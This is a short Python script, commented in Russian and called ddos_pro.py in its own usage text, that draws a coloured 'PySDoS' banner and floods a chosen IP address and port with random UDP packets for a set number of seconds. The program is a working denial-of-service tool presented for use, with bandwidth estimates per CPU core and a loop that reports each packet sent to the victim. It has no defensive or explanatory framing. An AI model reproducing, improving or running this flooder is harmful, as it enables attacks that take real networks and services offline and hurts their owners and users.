#Добавление библеотек
import time
import socket
import random
import sys
import os
#очищеие экрана
os.system("clear || cls")
#присваивание цветов
def oc(text):
    print("\033[31m {}" .format(text),end='')
def ob(text):
    print("\033[33m {}" .format(text),end='')
def oa(text):
    print("\033[34m {}" .format(text),end='')
#стартовое сообщение (при ошибочно набранной формуле)
def usage():
    #присваивание каждой букве графического образа
    p = ['###  ','#  # ','###  ','#    ','#    ','#    ']
    y = ['     ','#  # ','#  # ',' ##  ',' #   ','#    ']
    s = [' ##  ','#  # ',' #   ','  #  ','#  # ',' ##  ']
    d = ['###  ','#  # ','#  # ','#  # ','#  # ','###  ']
    o = [' ##  ','#  # ','#  # ','#  # ','#  # ',' ##  ']
    #создание постоянных
    wel = 'Welcome to'
    sp = '          '
    columns, rows = os.get_terminal_size(1)
    zyx = abs((rows-11)/2)
    ixy = 0
    while ixy < zyx:
        print()
        ixy+=1
    zx = abs((columns-30)/2)
    i=0 
    zi = 0
    #Отступ перед текстом
    while zi < zx:
        print(' ',end='')
        zi+=1
    print(sp+wel+sp)
    #отрисовка образа
    while i < 6:
        #возвращение первоначального значения переменной zi
        zi = 0
        #отступ перед картинкой
        while zi < zx:
            print(' ',end='')
            zi+=1
        #отрисовка i строки логотипа
        oa(p[i]),oa(y[i]),ob(s[i]),oc(d[i]),oc(o[i]),oc(s[i])
        print()
        i+=1
    
    xxa = ('Usage: python ddos_pro.py <ip> <port> <packet> <power>')
    xxb = (' power ≈ 1KB/P ')
    xxc = (' Dos ≈ 1500P/s 1GHz*Core ')
    xxd = (' Exaple: 24 Core 4GHz Power 8 ≈ 1,125GB/s ≈ 9Gb/s ')
    
    pzx = abs((columns-(len(xxa)))/2)
    pzi = 0
    while pzi < pzx:
        print(' ',end='')
        pzi+=1
    print(xxa)
    
    pzx = abs((columns-(len(xxb)))/2)
    pzi = 0
    while pzi < pzx:
        print(' ',end='')
        pzi+=1
    print(xxb)
    
    pzx = abs((columns-(len(xxa)))/2)
    pzi = 0
    while pzi < pzx:
        print(' ',end='')
        pzi+=1
    print(xxc)
    
    pzx = abs((columns-(len(xxa)))/2)
    pzi = 0
    while pzi < pzx:
        print(' ',end='')
        pzi+=1
    print(xxd)
    print('\033[32m')
    ixy=3
    while ixy < zyx:
        print()
        ixy+=1
def flood(victim, vport, duration, power):                         
    sock = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
    timeout =  time.time() + duration
    sent = 0
    bytes = random._urandom(int(power)*256)
    while 1:
        if time.time() > timeout:
            break
        else:
            pass
        client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        client.sendto(bytes, (victim, vport))
        sent = sent + 1
        print ("\033[1;91mSended \033[1;32m",sent,"\033[1;91mPackets to host \033[1;32m",victim," \033[1;91mTo Port \033[1;32m",vport)
def main():
    if len(sys.argv) != 5:
        usage()
    else:
        flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]), int(sys.argv[4]))

if __name__ == '__main__':
    main()